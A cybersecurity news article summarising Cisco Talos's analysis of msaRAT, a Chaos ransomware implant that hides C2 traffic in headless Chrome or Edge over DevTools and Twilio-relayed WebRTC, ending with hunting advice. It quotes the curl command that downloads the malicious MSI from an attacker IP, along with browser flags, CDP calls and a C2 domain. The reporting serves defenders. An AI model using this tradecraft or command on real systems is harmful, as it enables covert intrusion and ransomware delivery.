---
title: Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge
url: https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html
source: The Hacker News
date: 2026-07-23
fetch_date: 2026-07-24T05:05:41.547192
---

# Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge

#1 Trusted Cybersecurity News Platform

Followed by 5.70+ million[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.facebook.com/thehackernews)

[![The Hacker News Logo](data:image/png;base64...)](/)

**

**

[** Get the Latest News](#email-outer)

* [Home](/)
* [Newsletter](#email-outer)
* [Webinars](/p/upcoming-hacker-news-webinars.html)

* [Home](/)
* [Threat Intelligence](/search/label/Threat%20Intelligence)
* [Vulnerabilities](/search/label/Vulnerability)
* [Cyber Attacks](/search/label/Cyber%20Attack)
* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Expert Insights](https://thehackernews.com/expert-insights/)
* [Awards](https://awards.thehackernews.com/)

**

**

**

Resources

* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Awards](https://awards.thehackernews.com/)
* [Free eBooks](https://thehackernews.tradepub.com)

About Site

* [About THN](/p/about-us.html)
* [Jobs](/p/careers-technical-writer-designer-and.html)
* [Advertise with us](/p/advertising-with-hacker-news.html)

Contact/Tip Us

[**

Reach out to get featured—contact us to send your exclusive story idea, research, hacks, or ask us a question or leave a comment/feedback!](/p/submit-news.html)

Follow Us On Social Media

[**](https://www.facebook.com/thehackernews)
[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.youtube.com/c/thehackernews?sub_confirmation=1)
[**](https://www.instagram.com/thehackernews/)

[** RSS Feeds](https://feeds.feedburner.com/TheHackersNews)
[** Email Alerts](#email-outer)

[![cybersecurity](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrKWHErc__Wn0forfQ5eJ5sIR1hVKCHCTeNQOaAX4lbygJ8S1Xpemx6JXl78dpwiT65DDBGURp48A3EemKzmli-jXPI3v1928MnJm-1j2ZPUaFXCvuySFhyphenhyphenKR-Li6fAinFT2bhLgsqUSNUR_ggMAnOHi3jD1qYWHXvueX8WdtxAd6GYety9cBGYABo18hX/s728-e100/tt-d.jpg)](https://thehackernews.uk/ai-zero-trust-h-d)

# [Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge](https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html)

**Swati Khandelwal**Jul 23, 2026Ransomware / Network Security

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpS2QJv9o35m4hpF1MjxwE07jbvy9d4kK2fiSsQKFYaYtlUFReQ0j1YQ7fdaOPUN9s3J5oBpHG9vPIbTu_HwdjSDoz8UdhlJOp6ys6uBJlQxTL5BQlxtcOU2aRS1aaPeVwqvfCqGFzXEmQm0is0azXtyPQ8cNN61LbHtCllseMZQoYlwyrL4FV6BrkgqE/s1700-e365/chrome-headless.jpg)

The [Chaos ransomware group](https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html) ran its command-and-control through the victim's own browser. Cisco Talos on Thursday [detailed msaRAT](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/), the Rust implant behind it, found on a compromised Windows machine ahead of the encryptor.

The implant never opens an outbound connection of its own. Its process talks to `127.0.0.1` and nothing else. It starts Chrome or Edge in headless mode and drives the browser over the Chrome DevTools Protocol, the browser's own debugging API.

Every C2 message travels out from there through a WebRTC data channel relayed by Twilio's TURN service, so what a defender sees on the wire is a browser calling Cloudflare and Twilio. The attacker's own server address never appears at all.

## Chrome Does the Talking

msaRAT looks for Chrome or Edge through environment variables first, then falls back to the registry for Chrome. If no matching browser is found, the CDP path is skipped.

When it finds one, it starts the browser without a visible window using `--headless=new`, enables CDP with `--remote-debugging-port`, and points it at a separate `--user-data-dir`.

Since [Chrome 136](https://developer.chrome.com/blog/remote-debugging-port), Google no longer honors the debugging switch against the default profile, a change announced in March 2025 after [infostealers took up the flag for cookie theft](https://thehackernews.com/2025/05/eddiestealer-malware-uses-clickfix.html). msaRAT brings its own profile directory, so the change does not get in its way. Nothing in Talos's analysis shows it touching the victim's profile at all.

[![Cybersecurity](data:image/png;base64...)](https://thehackernews.uk/ai-vuln-protection-d)

The malware asks `/json/list/` for a debuggable target and connects to the returned WebSocket URL. It creates a tab, switches off Content Security Policy with `Page.setBypassCSP`, registers five callbacks through `Runtime.addBinding`, and calls `Runtime.evaluate` to inject JavaScript stored in plaintext in the binary's `.rdata` section.

Four callback names, `msaOpen`, `msaClose`, `msaError`, and `msaMessage`, gave Talos the malware's name. The fifth is `dataAck`.

That JavaScript fetches STUN and TURN configuration from a Cloudflare Worker at `is-01-ast[.]ols-img-12[.]workers[.]dev`, with Origin and Referer headers disguised as traffic from Microsoft's site. It builds a peer connection and posts an SDP offer to the same endpoint.

The answer comes back with no ICE candidates and the connection address set to `0.0.0.0`, so no direct peer-to-peer link can form, and the whole channel runs through Twilio's relay at `global.turn.twilio.com`. Once the data channel is live, the Worker drops out of the path.

Traffic on that channel is encrypted twice. The browser handles DTLS, and inside it sits a ChaCha-Poly1305-based scheme keyed by an ECDH exchange that starts with a `0xFE` handshake frame from the C2 immediately after connection.

The implant passes incoming command frames to `cmd.exe /e:ON /v:OFF /d /c <cmd>` for execution. Talos reads the send queue and flow control as likely built to move large payloads like screenshots or files reliably.

Neither half of the transport is new. [Praetorian showed in August 2025](https://www.praetorian.com/blog/ghost-calls-abusing-web-conferencing-for-covert-command-control-part-1-of-2/) that conferencing platforms' TURN infrastructure could carry a full C2 channel, and [Sansec found a skimmer in March 2026](https://sansec.io/research/webrtc-skimmer) using [WebRTC data channels to move stolen card data past HTTP inspection](https://thehackernews.com/2026/03/webrtc-skimmer-bypasses-csp-to-steal.html).

msaRAT puts both inside a Chaos-linked Rust implant that drives a headless browser through CDP.

## The Way In Is the Same as Ever

msaRAT arrives after the operator already has execution and before the encryptor runs. Talos does not say how this machine was reached. The group's [documented playbook](https://blog.talosintelligence.com/new-chaos-ransomware/) is spam floods, vishing, [Quick Assist](https://thehackernews.com/2024/05/cybercriminals-exploiting-microsofts.html), and RMM tools for persistence.

The implant itself comes down with a single curl command:

`curl.exe https://172.86.126[.]18:443/update_ms.msi -o C:\programdata\update_ms.msi`

Port 443, plain HTTP. Firewall rules written around port numbers without protocol inspection let it through. The MSI carries property data impersonating a Windows update, and a custom action fires at the end of installation to load an embedded DLL straight into memory.

That DLL is msaRAT: written in Rust on the Tokio async runtime, exporting a function named `RUN` for the installer to call.

## Hunting Notes

msaRAT is post-compromise malware and does not depend on a Chrome or Edge vulnerability, so defenders have no browser patch to apply for the technique itself.

The signal that lasts is process behavior. As Talos puts it, "all external communications are observed as originating from a legitimate browser process." Hunt for Chrome or Edge launched by an installer, a service, or another non-interactive parent with `--headless=new` and `--remote-debugging-port` set.

Then correlate that process with loopback traffic to the debugging port and outbound WebRTC. Where telemetry captures CDP messages,...